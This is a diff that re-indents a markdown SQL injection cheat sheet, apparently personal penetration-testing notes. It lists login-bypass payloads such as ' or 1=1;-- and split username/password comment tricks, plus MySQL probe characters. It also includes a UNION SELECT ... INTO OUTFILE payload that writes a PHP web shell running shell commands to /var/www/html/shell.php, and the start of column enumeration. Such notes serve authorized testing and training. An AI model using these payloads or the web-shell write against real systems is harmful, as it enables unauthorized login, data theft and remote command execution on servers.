@@ -1,32 +1,32 @@
 # SQL injection 
 
-#Login Bypass:   << replace ' with " if fail
-' or '1'='1
-' or 1=1;-- 
-' or 1=1;#
-') or ('x'='x
-' or <column> like '%';--
-' or 1=1 LIMIT 1;-- 
+## Login Bypass:   << replace ' with " if fail
+  ' or '1'='1
+  ' or 1=1;-- 
+  ' or 1=1;#
+  ') or ('x'='x
+  ' or <column> like '%';--
+  ' or 1=1 LIMIT 1;-- 
 
-USERNAME:   ' or 1/*
-PASSWORD:   */ =1 --
+  USERNAME:   ' or 1/*
+  PASSWORD:   */ =1 --
 
-USERNAME: admin' or 'a'='a
-PASSWORD '#
+  USERNAME: admin' or 'a'='a
+  PASSWORD '#
 
 If the database is mysql, try to dump all login info to files?
 
 Mysql
-'*' 
-'&'
-'^'
-'-'
-' or true;-- 
-' or 1;--
+  '*' 
+  '&'
+  '^'
+  '-'
+  ' or true;-- 
+  ' or 1;--
 
 union all select "<?php echo shell_exec($_GET['cmd']);?>",2,3,4,5,6 into OUTFILE '/var/www/html/shell.php'
 
-#Enumeration
+## Enumeration
 1. Confirm number of columns
 order by 1 -- 100
 
